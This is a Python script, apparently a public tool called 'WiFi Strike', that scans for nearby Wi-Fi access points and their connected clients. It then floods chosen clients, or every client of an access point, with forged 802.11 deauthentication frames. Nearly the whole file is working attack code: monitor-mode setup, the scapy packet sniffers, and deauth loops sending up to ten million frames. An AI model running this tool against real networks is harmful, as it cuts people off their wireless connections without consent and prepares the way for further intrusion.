#!/usr/bin/python3
import subprocess
import psutil
from scapy.all import *
import os
import argparse
r, g, y, b, p, w = "\033[31m", "\033[32m", "\033[33m", "\033[36m", "\033[35m", "\033[37m"
banner = f"""{w}
  _      ______________
 | | /| / /  _/ __/  _/
 | |/ |/ // // _/_/ /  
 |__/|__/___/_/ /___/  {r}
   _____________  ______ ______
  / __/_  __/ _ \\/  _/ //_/ __/
 _\\ \\  / / / , _// // ,< / _/  
/___/ /_/ /_/|_/___/_/|_/___/  
                               
{g}Wi-Fi Deauth Script by {r}ARXHR007{w}
"""
def get_all_interfaces():
    interfaces = psutil.net_if_addrs()
    return interfaces
def set_monitor_mode(interface):
    try:
        subprocess.run(["systemctl", "stop", "NetworkManager"])
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        subprocess.run(["systemctl", "start", "NetworkManager"],check=True)
        print(f"{g}Interface {r}{interface} {g}set to monitor mode.{w}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"{r}Failed to set {y}{interface} {r}to monitor mode")
        subprocess.run(["systemctl", "start", "NetworkManager"],check=True)
        return False
def set_manage_mode(interface):
    try:
        subprocess.run(["systemctl", "stop", "NetworkManager"])
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "managed"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        subprocess.run(["systemctl", "start", "NetworkManager"])
        print(f"{g}\nInterface {r}{interface} {g}set to managed mode.{w}")
    except subprocess.CalledProcessError as e:
        print(f"{r}Failed to set {y}{interface} {r}to managed mode: {e}")
        subprocess.run(["systemctl", "start", "NetworkManager"],check=True)
access_points = {}
def packet_handler(packet):
    if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
        bssid = packet[Dot11].addr2
        ssid = packet[Dot11Elt].info.decode() if packet[Dot11Elt].info else "<hidden>"
        channel = int(ord(packet[Dot11Elt:3].info))
        if bssid not in access_points:
            access_points[bssid] = {"ssid": ssid, "channel": channel}
            print(f"AP detected: BSSID: {bssid}, SSID: {ssid}, Channel: {channel}")
def scan_wifi(interface,f):
    os.system("clear")
    print(banner)
    print(f"{g}Interface {r}{interface} {g}set to monitor mode.{y}")
    print(f"{g}[{r}*{g}]{y} Scanning for Wi-Fi APs on interface {r}{interface}{p}\n")
    print(f"{g}Press {r}Ctrl + c {g}to stop {y}({g}default{b} 30s{y}){p}\n")
    sniff(iface=interface, prn=packet_handler, timeout=30)
    os.system("clear")
    print(banner)
    print(f"{g}Detected Access Points{r}:\n")
    k = 0
    l = []
    for bssid, info in access_points.items():
        k += 1
        l.append(bssid)
        print(f"{g}[{r}{k}{g}] {y}BSSID:{b} {bssid}{g}, {y}SSID: {b}{info['ssid']}{g},{y} Channel:{b} {info['channel']}")
    if(f==1):
        return
    x = int(input(f"{y}\nEnter the selection{r}:{y} "))
    return l[x-1]
unique_clients = set()
def packet_handler1(packet):
    if packet.haslayer(Dot11):
        if packet.type == 2:
            bssid = packet.addr3
            client = packet.addr2
            
            if bssid == gateway_mac and client not in unique_clients:
                unique_clients.add(client)
                print(f"Client detected: Client MAC: {client}")
def scan_clients(interface, target_bssid,f=0):
    print(f"{g}[{y}*{g}]{y} Scanning for clients connected to AP with BSSID {r}{target_bssid}{y} on interface{r} {interface}{p}\n")
    print(f"{g}Press {r}Ctrl + c {g}to stop {y}({g}default{b} 60s{y}){p}\n")
    sniff(iface=interface, prn=packet_handler1, timeout=60)
    os.system("clear")
    print(banner)
    print(f"\n{g}Detected Clients{r}:\n")
    k = 0
    l = []
    for client in unique_clients:
        k += 1
        l.append(client)
        print(f"{g}[{r}{k}{g}]{y} Client MAC: {b}{client}")
    if(f):
        return
    print(f"{g}[{r}0{g}]{r} Deauth all")

    x = int(input(f"\n{y}Select the client{r}:{y}"))
    if x == 0:
        return "0"
    return l[x-1]
def deauth(target_mac, gateway_mac, interface):
    os.system("clear")
    print(banner)
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
    print(f"{y}Sending deauthentication packets to {b}{target_mac}{y} from {b}{gateway_mac}{y}:{g}\n")
    print(f"{y}press {r}Ctrl + c {y}to stop{g}")
    sendp(frame, iface=interface, count=10000000, inter=0.1, verbose=1)
    print(f"{y}\nDeauth packets sent.")
def deauthall(interface, target_bssid, count):
    packet = RadioTap() / \
             Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / \
             Dot11Deauth(reason=7)
    print(f"{y}Sending deauth packets to{b} {target_bssid}{y}:\n")
    print(f"{y}press {r}Ctrl + c {y}to stop{g}")
    sendp(packet, iface=interface, count=count, inter=0.1, verbose=1)
    print(f"{y}\nDeauth packets sent.")
def auto_inteface():
        print(f"{g}Searching for network interface{r}:{p}")
        interfaces = get_all_interfaces().keys()
        global interface
        interface = None
        for iface in list(interfaces)[::-1]:
            print(f"{g}Attempting to set {b}{iface}{g} to monitor mode{w}")
            if set_monitor_mode(iface):
                interface = iface
                os.system("clear")
                print(banner)
                return (interface)
        if not interface:
            subprocess.run(["systemctl", "start", "NetworkManager"])
            print(f"{r}No suitable interface found.{w}")
            exit()
def man_inteface(interface):
        if interface not in get_all_interfaces().keys():
            print(f"{r}No interface found with that name{w}")
            subprocess.run(["systemctl", "start", "NetworkManager"])
            exit()
        print(f"Attempting to set {interface} to monitor mode...")
        if set_monitor_mode(interface):
            os.system("clear")
            print(f"Interface {interface} set to monitor mode.")
        else:
            print(f"{r}Something went wrong with the interface{w}")
            subprocess.run(["systemctl", "start", "NetworkManager"])
            exit()
def main():
    os.system("clear")
    print(banner)
    global gateway_mac
    parser = argparse.ArgumentParser(description="Wi-Fi deauth script")
    parser.add_argument("-man", "--manage", type=str, help="Set interface to managed mode")
    parser.add_argument("-mon", "--moniter", type=str, help="Set interface to monitor mode")
    parser.add_argument("-i", "--interface", type=str, help="Set interface to use")
    parser.add_argument("-l", "--list_interface", action='store_true', help="List interfaces to use")
    parser.add_argument("-t", "--target_mac", type=str, help="Target MAC address")
    parser.add_argument("-g", "--gateway_mac", type=str, help="Gateway MAC address")
    parser.add_argument("-sw", "--scan_wifi", action='store_true', help="Scan wifi avilable")
    parser.add_argument("-st", "--scan_target", action='store_true', help="Scan clints avilable")
    args = parser.parse_args()
    if os.geteuid() != 0:
        print(f"{g}[{r}!{g}]{r} Run it as root{w}\n")
        print(f"{g}ex: {r}$ {y}sudo wifistrike{w}\n")
        exit()
    if args.manage:
        if args.manage in get_all_interfaces():
            set_manage_mode(args.manage)
        else:
            print(f"{r}No interface found with that name{w}")
        return
    elif args.scan_wifi:
        if args.interface:
            man_inteface(args.interface)
            interface=args.interface
        else:
            interface=auto_inteface()
        scan_wifi(interface,1)
        set_manage_mode(interface)
        exit()
    elif args.scan_target:
        if args.interface:
            man_inteface(args.interface)
            interface=args.interface
        else:
            interface=auto_inteface()
        if args.gateway_mac:
            gateway_mac = args.gateway_mac
        else:
            gateway_mac = scan_wifi(interface,0)
        scan_clients(interface,gateway_mac,1)
        set_manage_mode(interface)
        exit()
    elif args.moniter:
        if args.moniter in get_all_interfaces():
            set_monitor_mode(args.moniter)
        else:
            print(f"{r}No interface found with that name{w}")
        return
    elif args.list_interface:
        print("Network interfaces:")
        for i in get_all_interfaces().keys():
            print(f"{b}{i}")
        return
    elif args.interface:
        man_inteface(args.interface)
        interface=args.interface
    else:
        interface=auto_inteface()
    if args.gateway_mac:
        gateway_mac = args.gateway_mac
    else:
        gateway_mac = scan_wifi(interface,0)
    if args.target_mac:
        target_mac = args.target_mac
    else:
        target_mac = None
    if not target_mac:
        client_mac = scan_clients(interface, gateway_mac)
    else:
        client_mac = target_mac
    os.system("clear")
    if client_mac == "0":
        deauthall(interface, gateway_mac, 1000000)
    else:
        deauth(client_mac, gateway_mac, interface)
    set_manage_mode(interface)
    print(f"{y}\nCheckout other tools at github: {r}arxhr007")
    print(f"{p}Thank you{w}")
if __name__ == "__main__":
    main()